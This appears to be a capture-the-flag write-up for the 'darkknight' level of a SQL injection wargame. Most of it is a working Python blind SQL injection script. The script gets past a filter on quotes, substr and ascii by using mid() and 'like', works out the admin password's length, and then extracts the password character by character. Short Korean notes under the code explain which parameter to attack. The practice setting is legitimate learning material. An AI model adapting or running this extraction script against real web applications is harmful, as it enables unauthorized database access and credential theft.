# Payload
```python
import requests
import time
import string
import sys

URL = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
CHARSET = string.digits +string.ascii_lowercase
MAX_LEN = 1000
COOKIES = {"PHPSESSID": "ql3tqlmum5mkma8kd3as04ppph"}

for i in range(1, MAX_LEN):
    payload = f"0 || id like \"admin\" && length(pw) like {i} -- \""
    # payload.replace("&", "%26")
    r = requests.get(
        URL,
        params={"pw": "0", "no" : payload},
        cookies=COOKIES
    )
    print(f"Trying length {i}...")
    if(r.text.count("Hello") >= 2):
        print(f"[Found] Password length is {i}")
        MAX_LEN = i
        break

def extract_password():
    found = ""
    for pos in range(1, MAX_LEN + 1):
        matched = False
        for ch in CHARSET:
            lo = chr(ord(ch)-1)
            hi = chr(ord(ch)+1)
            payload = f"0 || id like \"admin\" && mid(pw,{pos},1) like \"{ch}\" -- \""
            # payload = f"0' || id like 'admin' && '{lo}' < substring(pw,{pos},1) && substring(pw,{pos},1) < '{hi}' -- '"
            # payload = payload.replace("&", "%26")
            try:
                r = requests.get(URL, params={"pw": "0", "no": payload}, timeout=10, cookies=COOKIES)
                print(f"현재 시도중: payload = {payload}, pos={pos}, ch='{ch}'", end='\n', flush=True)
                print(f"Full URL: {r.url}", end='\r', flush=True)
            except Exception as e:
                print(f"요청 실패: {e}", file=sys.stderr)
                return False
            # "Hello"가 두 번 이상이면 조건이 참이라고 판단
            if r.text.count("Hello") >= 2:
                found += ch
                matched = True
                print(f"pos {pos}: {ch} (현재: {found})")
                break

        if not matched:
            print(f"문자 없음(pos={pos}). 비밀번호 추출 종료.")
            break
    return found

if __name__ == "__main__":
    print("시작: Blind SQLi 문자 추출")
    pwd = extract_password()
    print(f"추출된 비밀번호: {pwd}")
```
- 작은 따옴표를 못 쓰게 하고, substr 문자와 ascii 문자가 포함되면 안 된다.
	- substr 대신 mid 함수를 사용
- 파라미터로 pw와 no를 받지만, 익스플로잇은 no에서 진행하면 된다.
	- pw에서는 작은 따옴표를 열지만 작은 따옴표는 금지당해 사용자가 닫을 방법이 없다. 다만 no는 맨 끝에 있고, 직접 따옴표 쌍을 조절할 수 있다.
- 